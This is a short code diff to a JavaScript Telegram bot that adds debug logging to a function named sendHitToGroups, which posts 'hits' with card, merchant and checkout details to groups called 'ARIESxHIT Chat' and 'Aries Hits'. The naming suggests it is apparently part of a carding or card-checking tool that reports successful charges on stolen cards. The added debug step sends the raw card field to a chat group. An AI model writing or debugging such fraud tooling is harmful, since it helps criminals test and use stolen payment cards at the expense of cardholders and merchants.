@@ -496,11 +496,32 @@ const MAIN_MENU_KEYBOARD = {
 
 // Send hit notification to group chats
 async function sendHitToGroups(hitData, checkoutUrl) {
-  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-  const GROUP_1 = process.env.TELEGRAM_GROUP_1; // ARIESxHIT Chat - Simple format
-  const GROUP_2 = process.env.TELEGRAM_GROUP_2; // Aries Hits - Detailed format
+  console.log('[SEND_HIT_GROUPS] Called with:', { hitData, checkoutUrl });
 
-  if (!BOT_TOKEN) return;
+  // DEBUG: Send a visible test message to confirm function is called
+  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+  const debugMessage = `🔧 DEBUG: sendHitToGroups called\nUser: ${hitData.userName}\nCard: ${hitData.card}\nMerchant: ${hitData.merchant}\nTime: ${new Date().toLocaleTimeString()}`;
+
+  try {
+    // Send debug message to the first group as a test
+    const GROUP_1 = process.env.TELEGRAM_GROUP_1;
+    if (GROUP_1 && BOT_TOKEN) {
+      await sendMessage(BOT_TOKEN, GROUP_1, debugMessage);
+      console.log('[SEND_HIT_GROUPS] Debug message sent to GROUP_1');
+    }
+  } catch (debugError) {
+    console.error('[SEND_HIT_GROUPS] Debug message failed:', debugError.message);
+  }
+
+  const GROUP_1_ID = process.env.TELEGRAM_GROUP_1; // ARIESxHIT Chat - Simple format
+  const GROUP_2_ID = process.env.TELEGRAM_GROUP_2; // Aries Hits - Detailed format
+
+  console.log('[SEND_HIT_GROUPS] Config - BOT_TOKEN:', !!BOT_TOKEN, 'GROUP_1:', GROUP_1_ID, 'GROUP_2:', GROUP_2_ID);
+
+  if (!BOT_TOKEN) {
+    console.log('[SEND_HIT_GROUPS] No BOT_TOKEN, returning');
+    return;
+  }
 
   // Detect merchant name - prioritize hitData.merchant, fallback to URL detection
   const merchantName = hitData.merchant || detectMerchant(checkoutUrl);
